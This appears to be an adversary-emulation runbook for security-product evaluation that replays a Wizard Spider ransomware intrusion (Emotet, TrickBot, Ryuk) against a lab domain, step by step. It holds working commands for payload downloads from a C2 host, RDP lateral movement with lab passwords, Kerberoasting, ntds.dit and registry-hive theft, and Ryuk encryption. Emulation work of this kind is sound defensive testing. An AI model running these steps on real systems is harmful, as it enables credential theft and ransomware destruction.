# Scenario Overview

This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).

This scenario emulates Wizard Spider TTPs based on  several malware specimens either used by or associated with the Wizard Spider actors:

1. Emotet
2. Trickbot
3. Ryuk

---

## Step 1 - Initial Compromise

:microphone: `Voice Track:`

Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.

The word document contains [obfuscated VBA macros](../../Resources/Emotet_Dropper) that downloads and executes a malicious DLL.

The [malicious DLL](../../Resources/Emotet) establishes a C2 session with the adversary control server.

The malicious DLL is based on Emotet.

```
Compromised user info:

User:	judy@oz.local

System: 10.0.0.7 / dorothy

C2:	192.168.0.4:80 HTTP; traffic is AES-encrypted with symmetric key and base64 encoded
```

*Note: the document is pre-positioned in the environment.*

*We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs.*

---

### :biohazard: Procedures

Upload the Emotet-dropper document to Dorothy's desktop:

```bash
smbclient -U 'oz\judy' //10.0.0.7/C$ -c "put wizard_spider/Resources/Emotet_Dropper/ChristmasCard.docm Users/judy/Desktop\ChristmasCard.docm;" "Passw0rd!"
```

Start the control server from your terminator terminal.

```bash
cd ~/wizard_spider/Resources/control_server
sudo ./controlServer
```

Open a new terminal tab (ctrl-shift-T); double click the terminal tab and rename it to "RDP to Dorothy"

RDP into Dorothy / 10.0.0.7 as user Judy:

```bash
xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
```

1. Open outlook if its not already open, log in to Office account if not already logged in

2. Open the ChristmasCard.docm document on the desktop; enable macros when prompted.

3. You should see a terminal flash; wait for it to execute the Emotet DLL.

4. Go back to your control server tab; you should have a new callback.

5. Take a screenshot of your new session, and paste in the vendor slack channel.

```
# Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. [6][13][2][8][12]
```
[Source Code - Dropper Word Document](../../Resources/Emotet_Dropper)

[Source Code - Emotet DLL](../../Resources/Emotet)


<br>

`For testing without MS Office; be aware that this is not identical to the Word document implementation - the process lineage and file paths change significantly with this method.`

Open PowerShell and run:

```pwsh
Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile $env:AppData\adb.vbs
```

```pwsh
# Wizard Spider has used HTTP for network communications.[5]

cscript.exe $env:AppData\adb.vbs
```

### :microscope: Cited Intelligence

* https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf

* https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor

* https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html

* https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/

* https://blog.talosintelligence.com/2019/01/return-of-emotet.html

## Step 2 - Emotet Persistence

:microphone: `Voice Track:`

Wizard Spider establishes registry persistence by adding the registry key:

```
Path: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Key: blbdigital

Value: rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL
```

The registry key is written using the `RegSetValueExA` WinAPI function.

---

### :biohazard: Procedures

Open a horizontal terminal tab (right-click split horizontally).

Copy/paste the command in your lower terminal tab:

```bash
# Emotet has been observed adding the downloaded payload to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key to maintain persistence.[6][7][8]

# Wizard Spider has established persistence via the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and a shortcut within the startup folder.[2][3]

./evalsC2client.py --set-task DOROTHY_DABB41A5 1
```
[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp#L21)

### :microscope: Cited Intelligence
* https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/

* https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor

* https://www.us-cert.gov/ncas/alerts/TA18-201A

* https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html

<br>

## Step 3 - Emotet Host Discovery and Credential Collection

:microphone: `Voice Track:`

Wizard Spider first enumerates local processes using WinAPI functions: `CreateToolhelp32Snapshot` and `Process32First`. 

Wizard Spider then downloads and loads an Outlook scraper DLL using the `LoadLibraryW` and `GetProcAddress` functions. 

Lastly, Wizard Spider executes the Outlook-scraper to dump emails and contacts.

One of the emails contains credentials for another user, bill@oz.local, which will be used in the next step.

Download Info:

```
URL (HTTP GET): http://192.168.0.4:80/modules

Download occurs over HTTP. All traffic is AES encrypted and base64 encoded in transit.

File Write:     C:\Windows\SysWOW64\Outlook.dll
```

---

### :biohazard: Procedures

Enumerate processes.

```bash
# Emotet has been observed enumerating local processes.[17]

./evalsC2client.py --set-task DOROTHY_DABB41A5 2
```
[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/hostdiscovery.cpp#L172)


Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current working directory.

```bash
./evalsC2client.py --set-task DOROTHY_DABB41A5 3
```
[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L114)

Load Outlook Scraper DLL into emotet's address space via call to LoadLibraryW() and GetProcAddress().

```bash
./evalsC2client.py --set-task DOROTHY_DABB41A5 4
```
[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/loadoutlookscraper.cpp#L16)

Scrape email content from Outlook inbox via _popen call to PowerShell.

```bash
# Emotet has been observed leveraging a module that scrapes email data from Outlook.[3]

# Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. [7][3]

./evalsC2client.py --set-task DOROTHY_DABB41A5 5
```
[Source Code](../../Resources/Emotet/OutlookScraper/OutlookScraper/outlook.cpp#L64)

[_popen info, because I've never heard of it either](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-160)


Scrape email addresses from inbox.

```bash
# Emotet has been observed leveraging a module that can scrape email addresses from Outlook.[3][4]

./evalsC2client.py --set-task DOROTHY_DABB41A5 8
```
[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L99)

:warning: Sign out of RDP session: `Right-click Windows icon -> Shut down or sign out -> Sign out`

<br>

### :microscope: Cited Intelligence
* https://unit42.paloaltonetworks.com/emotet-command-and-control/

* https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/

* https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/

* https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf

<br>

## Step 4 - Move Laterally Deploy TrickBot

:microphone: `Voice Track:`

During this step, Wizard Spider uses bill's credentials to RDP into Toto.

Wizard Spider uploads and executes a malicious EXE based on TrickBot. 

Trickbot is uploaded to target using an RDP-mounted network share.

Once executed, Trickbot calls back to the C2 server over HTTP.

```
Compromised user info:

User:	bill@oz.local

System: 10.0.0.8 / toto

File Write (Tribot EXE): %AppData%\uxtheme.exe

C2:	192.168.0.4:447 HTTP - no encryption or obfuscation
```

---

### :biohazard: Procedures

Change your RDP tab name to "RDP into Toto"

RDP into Toto and create RDP drive that has TrickBot folder structure

```bash
# Wizard Spider has used RDP for lateral movement.[5][2][8]

cd ~/
xfreerdp +clipboard /u:oz\\bill /p:"Fall2021" /v:10.0.0.8 /drive:X,wizard_spider/Resources/TrickBot/WNetval
```

Open `CMD.exe` and copy file to bill's AppData\Roaming

:warning: make sure you're in a `CMD` shell

```bash
copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe
```

 Kick off exeuction by starting TrickBotClientExe.exe

```bash
cd %AppData%
uxtheme.exe
```

Switch back to your C2 terminal window.

Take a screenshot of the new Trickbot session, and paste in Slack.

### :microscope: Cited Intelligence
* https://attack.mitre.org/groups/G0102/

* https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/

## Step 5 - TrickBot Discovery

:microphone: `Voice Track:`

In step 5 Wizard Spider uses TrickBot to perform detailed system discovery.

You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.exe, and so on.

Trickbot executes commands via the C standard library function, `system()`.

### :biohazard: Procedures

From your C2 server tab, execute the following commands.

```bash
# TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.[1][2][7][12]

./evalsC2client.py --set-task TrickBot-Implant "systeminfo > discovery.txt"
```

```bash
# TrickBot collects a list of install programs and services on the system’s machine.[1]

./evalsC2client.py --set-task TrickBot-Implant "sc query >> discovery.txt"
```


```bash
# TrickBot collects the users of the system.[1][6]

./evalsC2client.py --set-task TrickBot-Implant "net user >> discovery.txt"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant  "net user /domain >> discovery.txt"
```

```bash
# TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.[1][6][7]

./evalsC2client.py --set-task TrickBot-Implant "ipconfig /all"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "netstat -tan"
```

```bash
# Trickbot gathers domain specfic/client specfic information
./evalsC2client.py --set-task TrickBot-Implant "net config workstation >> discovery.txt"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "nltest /domain_trusts /all_trusts >> discovery.txt"
```

```bash
# TrickBot can identify the groups the user on a compromised host belongs to.[7]

./evalsC2client.py --set-task TrickBot-Implant "whoami /groups >> discovery.txt"
```

### :microscope: Cited Intelligence

* https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf
* https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre
* https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/
* https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware
* https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf

## Step 6 - Kerberoast the DC

:microphone: `Voice Track:`

In this step Wizard Spider performs Kerberoasting using a public tool, Rubeus.

Through Kerberoasting, Wizard Spider obtains encrypted credentials for the domain admin, vfleming.

Wizard Spider cracks the credentials offline for use in the next step. 

*Note: offline cracking isn't performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior.*

---

### :biohazard: Procedures

```bash
# Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[6][3][2][8]

./evalsC2client.py --set-task TrickBot-Implant "get-file rubeus.exe"
```

```bash
./evalsC2client.py --set-task TrickBot-Implant "rubeus.exe kerberoast /domain:oz.local"
```

### :microscope: Cited Intelligence

* https://us-cert.cisa.gov/ncas/alerts/aa20-302a
* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
* https://thedfirreport.com/2020/10/08/ryuks-return/
* https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/

<br>

## Step 7 - Lateral Movement to DC 

:microphone: `Voice Track:`

In step 7 Wizard Spider RDP's into the domain controller as user vfleming.

Wizard Spider dowloads a TrickBot variant to the DC using PowerShell's `Invoke-WebRequest` command.

Wizard Spider then establishes registry persistence to execute Trickbot when vflemming logs in.

Lastly, Wizard Spider enumerates the domain using the `adfind` utility.

```
Compromised user info:

User:	vfleming@oz.local

System: 10.0.0.4 / wizard

File Write (Tribot EXE variant): %AppData%\uxtheme.exe

Registry Write:  HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\

Key: Userinit

Value: Userinit.exe, $env:AppData\uxtheme.exe
```

---

### :biohazard: Procedures

:warning: Go back to your Toto RDP session and sign out: `Right-click Windows icon -> Shut down or sign out -> Sign out`

Rename your RDP terminal to "RDP to wizard"

RDP to wizard / 10.0.0.4.

```bash
# Wizard Spider has used RDP for lateral movement.[5][2][8]

xfreerdp +clipboard /u:oz\\vfleming /p:"q27VYN8xflPcYumbLMit" /v:10.0.0.4 /drive:X,wizard_spider/Resources/Ryuk/bin
```

:warning: Open an **administrator powershell**.

Download a trickbot variant (same binary with a zero appended to the very end)

```pwsh
# Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.[3]

Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/uxtheme.exe -OutFile $env:AppData\uxtheme.exe
```

```pwsh
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
```

```pwsh
# Wizard Spider has also used AdFind and nltest/dclist to enumerate domain computers, including the domain controller.[4][5][3][7][6]

adfind -f "(objectcategory=group)"
```

### :microscope: Cited Intelligence

* https://us-cert.cisa.gov/ncas/alerts/aa20-302a
* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
* https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/
* https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/
* https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html
* https://thedfirreport.com/2020/10/08/ryuks-return/
* https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

## Step 8 - Dump Active Directory Database (ntds.dit)

:microphone: `Voice Track:`

During step 8, Wizard Spider creates a volume shadow copy in order to collect the active directory database (ntds.dit).

Wizard Spider uses vssadmin to create the shadow copy.

Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share.

--- 

### :biohazard: Procedures

:warning: Spawn a **CMD** shell within your PowerShell window:

```bash
cmd.exe
```

```bash
cls
```

```bash
# Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.[3]

vssadmin.exe create shadow /for=C:
```

You will get output resembling the following:

```
vssadmin output:
    Shadow Copy ID: {cb0a1e0b-e4d7-44f4-aacb-daed56db01ce}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

:warning: Make sure the `\\\\?\GLOBALROOT...HarddiskVolumeShadowCopy1` path matches your output!

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit
```

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE
```

```bash
reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE
```

Notionally, Wizard Spider carves credentials offline from ntds.dit using tools like Impacket's secretsdump.py

### :microscope: Cited Intelligence

* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

<br>

## Step 9 - Ryuk Inhibit System Recovery

:microphone: `Voice Track:`

In step 9, Wizard Spider prepares to deploy an executable based on the Ryuk ransomware.

At the beginning of this step, Wizard Spider mounts the C$ share of a lateral host, toto / 10.0.0.8.

Files on Toto will be encrypted in the next step.

Next, Wizard Spider uploads two files to disk: kill.bat and window.bat.

These files are used to stop specific services and delete backups prior to encrypting the system.

---

### :biohazard: Procedures

Mount share so Ryuk can encrypt lateral drives:

```bash
net use Z: \\10.0.0.8\C$
```

```bash
# Ryuk has called kill.bat for stopping services, disabling services and killing processes.[1]

# Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.[4]

# Ryuk has stopped services related to anti-virus.[2]
```

```
copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat

C:\Users\Public\kill.bat
```
[Source Code](../../Resources/Ryuk/bin/kill.bat)

```bash
# Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[1]
```

```
copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat

C:\Users\Public\window.bat
```
[Source Code](../../Resources/Ryuk/bin/window.bat)

### :microscope: Cited Intelligence

* https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/
* https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html
* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf

<br>

## Step 10 - Ryuk Encryption for Impact

:microphone: `Voice Track:`

In our final step, Wizard Spider uploads and executes Ryuk.

Ryuk is uploaded using the RDP-mounted network share, and executed from CMD.

When Ryuk executes, it will first gain `SeDebugPrivilege`.

Ryuk will then and inject its own executable into a remote process,notepad.exe, via `WriteProcessMemory` and `CreateRemoteThread` WinAPI calls.

From the remote process, Ryuk will encrypt files on wizard/10.0.0.4's C:\Users\Public directory (recursive).

Next, Ryuk encrypts files on Toto/10.0.0.8 at \\C$\Users\Public (mounted on wizard as Z:).

Ryuk uses a symmetric key algorithm, AES256 to encrypt files.

Note that the symmetric key is itself encrypted with RSA2048.

*Note: early versions of our Ryuk emulation encrypted the entire filesystem; however, this proces took hours, rather than minutes, so we scaled it back due to time constraints.*

---

### :biohazard: Procedures

```bash
# Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.[11]

# Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes.[1]

# Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.[1]

# Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.[1]

# Ryuk has used the C$ network share for lateral movement.[5]

# Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[1][5]
```

```
copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe
```

```bash
C:\Windows\System32\notepad.exe
```

```bash
C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe
```

To confirm that encryption worked, execute the following in CMD:

```bash
# confirm files are encrypted (local)
type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf

# confirm encryption (remote)
type \\toto\C$\Users\Public\Documents\Whitepaper_ekFUNt.rtf
```

### :microscope: Cited Intelligence

* https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/
* https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/
* https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/
* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf
* https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/

